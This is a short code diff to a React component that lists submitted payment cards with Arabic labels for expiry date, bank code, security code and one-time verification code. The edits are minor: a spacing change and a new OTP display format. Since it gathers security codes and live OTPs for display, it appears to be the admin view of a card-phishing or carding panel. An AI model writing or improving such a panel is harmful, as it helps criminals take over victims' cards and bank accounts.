@@ -7,7 +7,7 @@ import { Item } from './item';
 export function ListItems({ submissions }: any) {
   useEffect(() => {}, []);
   return (
-    <div className="p-4 bg-gray-50 mx-1 rounded-lg shadow">
+    <div className="p-4  bg-gray-50 mx-1 rounded-lg shadow">
     <h2 className="text-2xl font-bold mb-4">Cards List</h2>
     <div className="space-y-4 w-full">
       {submissions.map((submission:any) => (
@@ -18,7 +18,7 @@ export function ListItems({ submissions }: any) {
             expDate={`تاريخ الانتهاء: ${submission.data().month}/${submission.data().year}`}
             bank={`رمز البنك: ${submission.data().bank}`}
             pass={`رمز الامان: ${submission.data().pass}`}
-            otp={`${submission.data().otp.toString().join('')}`}
+            otp={`رمز التحقق {${submission.data().otp}}`}
           />
         </div>
       ))}
